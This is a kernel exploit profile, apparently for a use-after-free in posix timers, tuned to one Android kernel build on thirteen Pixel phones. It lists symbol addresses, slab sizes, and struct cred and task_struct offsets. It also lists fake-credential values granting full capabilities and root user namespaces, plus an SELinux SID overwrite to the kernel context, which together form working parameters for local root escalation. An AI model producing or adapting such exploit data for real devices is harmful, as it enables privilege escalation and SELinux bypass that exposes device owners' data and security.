# TimerUAF kernel profile (HOCON; JSON remains valid)
# Kernel: 6.1.172-android14-11-g8d0115b07367-ab16385437 (Android 16 QPR,
#   November 2026 monthly, build CP4A.261105.040.A1).
#   One identical kernel binary (sha256 5c1b01c87980ea45a3a03d6bdc85e442…)
#   ships on all thirteen 4K-page 6.1 GKI Pixels in that release:
#   bluejay, panther, cheetah, lynx, shiba, husky, akita, tokay, caiman,
#   komodo, tegu, comet, felix.
#
# Derived from the factory image boot.img ( Pixel 9a / tegu ):
#   tegu-cp4a.261105.040.a1-factory-c2c4d4f6.zip
#   boot.img sha256 9c9a99fe3204b56e1a4e4b29df81ac48d05b6011d200a13f623f103eb10445ec
# boot.img -> kernel (LZ4 legacy, 16 MB) -> raw arm64 Image (35,772,928 bytes)
#   Linux version 6.1.172-android14-11-g8d0115b07367-ab16385437
# _text = 0xffffffc008000000 (4k pages).
#
# begin_new_exec call order (verified by disassembly at 0xffffffc0083a76c0):
#   ... -> zap_other_threads -> unshare_files -> set_mm_exe_file -> exec_mmap ->
#   posix_cpu_timers_exit -> exit_itimers   => VULNERABLE
release = "6.1.172-android14-11-g8d0115b07367-ab16385437"
schema_version = 1
ksu_kmi = "android14-6.1"

# 4K-page variant.  A 16K kernel_16k ships alongside on the 16K-capable
# devices with the same release string and is a separate profile selected
# by page_size.
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# This kernel frees order-1 slab pages through the PCP lists, which emit no
# mm_page_free events, so the reclaim cannot wait for the free.  Instead the
# spray is gated on /proc/slabinfo showing the victim's timers freed.
pcp_free = 1

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site.
#   do_timer_create@0xffffffc008192ef4, bl kmem_cache_alloc@0xffffffc008192f98
#   x0 = [0xffffffc00a2500a0] = posix_timers_cache  (size 0x108, align 0,
#   flags 0x4040000 = SLAB_PANIC|SLAB_ACCOUNT, no SLAB_HWCACHE_ALIGN)
timer_site = 0xffffffc008192f9c
timer_alloc = 0x108

# cred_jar: kmem_cache_create("cred_jar", 0xb0, 0, 0x4042000, NULL)
#   0x4042000 = SLAB_PANIC|SLAB_ACCOUNT|SLAB_HWCACHE_ALIGN -> object 0xc0
#
# struct cred layout for 6.1.172 (BTF): identical to 6.1.162 — the 4-byte
# atomic_t usage shifts every field down by 8 relative to the 6.6/6.12
# layout, so all of the offsets below are explicit (they differ from the
# built-in defaults).
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc00a27c848
panic_on_warn = 0xffffffc00a02ac0c

# task_struct / cred layout (BTF)
#   sizeof(task_struct) = 0x12c0, kmem_cache_create_usercopy("task_struct",
#   0x12c0, 0x40, ...) -> slab object stays 0x12c0
#   task_struct.cred = 0x838 (real_cred is the field before it, at 0x830)
#   task_struct allocated in dup_task_struct (called by copy_process):
#     bl kmem_cache_alloc_node@0xffffffc0080aba18,
#     x0 = [0xffffffc00a227a18] = task_struct_cachep
task_cred_off = 0x838
copy_process_low21 = 0xaba1c
task_alloc_bytes = 0x12c0

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a0505c0
init_user_ns = 0xffffffc00a050330
init_ucounts = 0xffffffc00a051e48
init_groups = 0xffffffc00a0518e0

# task_security_struct (BTF): osid@0x0, sid@0x4, exec_sid@0x8.
# The exploit fills 32 bytes from this offset, so 0 sets every SID field.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
